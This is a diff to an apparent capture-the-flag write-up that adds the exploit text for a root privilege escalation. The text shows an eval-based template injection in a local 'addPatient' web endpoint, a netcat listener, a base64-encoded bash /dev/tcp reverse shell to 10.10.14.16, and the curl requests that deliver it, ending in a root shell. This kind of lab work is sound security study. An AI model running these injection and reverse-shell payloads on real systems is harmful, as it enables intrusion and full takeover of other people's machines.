@@ -264,24 +264,94 @@ We will therefore port forward to access the application locally:
 ssh sedric@10.129.89.231 -L 54321:127.0.0.1:54321
 ```
 
-Looking closely at the code, we discover that the application is using eval:
+Taking a closer look at notif.py, we discover that the application is using eval:
 
-<img src="Images/22-Python-Eval.png" width="600">
+```
+    try:
+        return eval(f"f'''{template}'''")
+    except Exception as e:
+        return f"[EVAL_ERROR] {e}"
+```
 
 Eval is dangerous because it executes strings as if they are programming code. Leveraging this, we can craft some exploit code, possibly using AI, to exploit this script and elevate ourselves to the root user. First, we will test our hypothesis to see if we can actually execute Python code:
 
-<img src="Images/23-addPatient-Test.png" width="600">
+#### Request attempt 1:
+
+```
+curl -s -X POST http://127.0.0.1:54321/addPatient \
+  -H "Content-Type: application/xml" \
+  --data-binary "<patient>
+    <firstname>{__import__('os').getcwd()}</firstname>
+    <lastname>b</lastname>
+    <sender_app>a</sender_app>
+    <timestamp>x</timestamp>
+    <birth_date>01/01/2000</birth_date>
+    <gender>M</gender>
+  </patient>"
+```
 
 This proves successful, however, regex is preventing us from entering certain characters, including a space. This prevents us from executing a reverse shell:
 
-<img src="Images/24-addPatient-Reverse-Shell-1.png" width="600">
+#### Example:
+
+```
+curl -s -X POST http://127.0.0.1:54321/addPatient   -H "Content-Type: application/xml"   --data-binary "<patient>
+    <firstname>{__import__('os').system(\"busybox nc 10.10.14.16 4444 -e /bin/bash\")}</firstname>
+    <lastname>b</lastname>
+    <sender_app>a</sender_app>
+    <timestamp>x</timestamp>
+    <birth_date>01/01/2000</birth_date>
+    <gender>M</gender>
+  </patient>"
+```
+
+#### Example output:
+
+```
+[INVALID_INPUT]
+```
 
 A solution here is to use a Base64 encoded payload and then decode and execute the contents in the code block:
 
-<img src="Images/25-Payload-B64.png" width="600">
+#### Start a listener:
 
-<img src="Images/26-addPatient-Reverse-Shell-2.png" width="600">
+```
+nc -lvnp 4444
+```
+
+#### Base64 encode a reverse shell:
+
+```
+echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'" | base64 -w0
+```
+
+#### Output:
+
+```
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQ0IDA+JjEn
+```
+
+#### Execute the payload:
+
+```
+curl -X POST http://127.0.0.1:54321/addPatient   -H "Content-Type: application/xml"   --data '<patient>
+    <firstname>{__import__("os").system(__import__("base64").b64decode("YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQ0IDA+JjEn").decode())}</firstname>
+    <lastname>b</lastname>
+    <sender_app>a</sender_app>
+    <timestamp>x</timestamp>
+    <birth_date>01/01/2000</birth_date>
+    <gender>M</gender>
+</patient>'
+```
 
 The code successfully executes and we catch a root shell on our listener:
 
-<img src="Images/27-Root-Shell.png" width="600">
+#### Output:
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.129.89.231 59198
+bash: cannot set terminal process group (3536): Inappropriate ioctl for device
+bash: no job control in this shell
+root@interpreter:/usr/local/bin# 
+```
